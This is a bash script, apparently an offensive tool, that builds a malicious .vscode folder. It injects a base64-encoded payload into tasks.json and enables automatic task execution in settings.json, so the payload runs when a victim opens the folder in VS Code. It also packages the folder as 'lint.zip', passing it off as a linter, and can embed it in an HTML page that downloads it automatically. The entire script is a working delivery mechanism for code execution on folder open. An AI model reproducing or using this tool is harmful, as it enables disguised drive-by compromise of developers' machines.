#!/usr/bin/env bash
for i in "$@"; do
    case $i in
    --windows|-w)
        WINDOWS_PAYLOAD=$2
        shift;shift;
        ;;
    --zip|-z)
        ZIP=true
        ;;
    --serve|-s)
        SERVE=true
        ;;
    --help|-h)
        HELP=true
        ;;
    *)    
        ;;
    esac
done

## colors spectrum
TEAL='\033[1;36m'
NC='\033[0m' # No Color
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
CYAN='\033[1;96m'


## Help part
if [[ "$HELP" ||  $# -eq 0  ]];
then
    echo -e "Usage: ${GREEN}$0${NC} [flag] ${GREEN}'${NC}[payload]${GREEN}'${NC} "
    echo -e "\t--windows/-w\tspecify specific payload for windows"
    echo -e "\t--zip/-z\tzip the malicious .vscode folder"
    echo -e "\t--serve/-s\tserve zip file in HTML (automatically dl when browsed, use embeddInHTML)"
    echo 
    exit 92
fi

SETTING_JSON='{"task.allowAutomaticTasks": "on"}'

PAYLOAD_B64="$(echo "${1}" | base64 -w0)"

TASKFILE="tasks.json"

# creating .vscode
echo -e "${CYAN}[${RED}+${CYAN}]${NC} Create .vscode"
rm -rf .vscode &>/dev/null
mkdir .vscode
cp $TASKFILE.tpl .vscode/$TASKFILE

# Inject payload
echo -e "${CYAN}[${RED}+${CYAN}]${NC} Inject payload"
sed -i "s/PAYLOAD_B64/${PAYLOAD_B64}/g" .vscode/${TASKFILE}
sed -i "s/WINDOWS_PAYLOAD/${WINDOWS_PAYLOAD}/g" .vscode/${TASKFILE}

# Inject automatic task run setting
echo -e "${CYAN}[${RED}+${CYAN}]${NC} Inject automatic task run setting"
echo "${SETTING_JSON}" > .vscode/settings.json

# Zip it?
if [[ "$ZIP" ]] || [[ "$SERVE" ]];
then
    echo -e "${CYAN}[${RED}+${CYAN}]${NC} Zip .vscode folder to lint.zip"
    zip -r lint.zip .vscode
fi

if [[ "$SERVE" ]];
then
    echo -e "${CYAN}[${RED}+${CYAN}]${NC} Embed linter.zip in HTML (${BLUE}index.html${NC})"
    git clone https://github.com/Arno0x/EmbedInHTML.git &>/dev/null
    cd EmbedInHTML
    python2.7 embedInHTML.py -k vscodepwn -f ../lint.zip -o index.html -m application/zip &>/dev/null
    mv output/index.html ..
    cd ..
    rm -rf EmbedInHTML
fi